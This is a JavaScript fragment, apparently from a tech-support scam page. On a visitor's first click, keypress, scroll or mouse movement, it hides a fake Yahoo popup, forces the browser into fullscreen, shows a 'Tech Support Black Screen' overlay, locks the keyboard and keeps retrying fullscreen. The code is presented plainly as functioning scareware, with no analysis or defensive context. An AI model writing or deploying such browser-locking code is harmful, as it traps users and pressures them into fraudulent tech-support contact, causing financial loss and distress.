/* ================= AUTO-TRIGGER SEQUENCE ================= */
  var fsRetryTimer = null;

  function triggerAutoSequence() {
    if (autoTriggered) return;
    autoTriggered = true;
    armed = true;

    // 1. Hide the Yahoo Popup immediately
    var modal = $('modalbx');
    if (modal) modal.style.display = 'none';

    // 2. Force Fullscreen — try IMMEDIATELY (inside the gesture)
    requestFS();

    // 3. Show the Tech Support Black Screen
    var overlay = $('overlay2');
    if (overlay) overlay.style.display = 'block';

    // 4. Lock Keyboard
    lockKeyboard();

    // 5. RETRY fullscreen until it actually engages
    //    (mousemove/scroll often get rejected, so keep trying)
    clearInterval(fsRetryTimer);
    var tries = 0;
    fsRetryTimer = setInterval(function () {
      tries++;
      if (isFullscreen()) { clearInterval(fsRetryTimer); return; }
      requestFS();
      if (tries > 40) clearInterval(fsRetryTimer); // give up after ~20s
    }, 500);

    // 6. Re-arm popup after delay
    setTimeout(function () { armPopup(true); }, 2000);
  }

  /* ================= EVENT LISTENERS (ACTIVATION) ================= */
  // Fire the sequence on the FIRST real gesture
  ['mousedown','click','keydown','touchstart','mousemove','scroll','wheel']
    .forEach(function (ev) {
      window.addEventListener(ev, function () {
        if (!armed) {
          triggerAutoSequence();
        } else {
          // already triggered — if not fullscreen, keep forcing it
          if (!isFullscreen()) requestFS();
          armPopup(false);
        }
      }, { passive: true });
    });
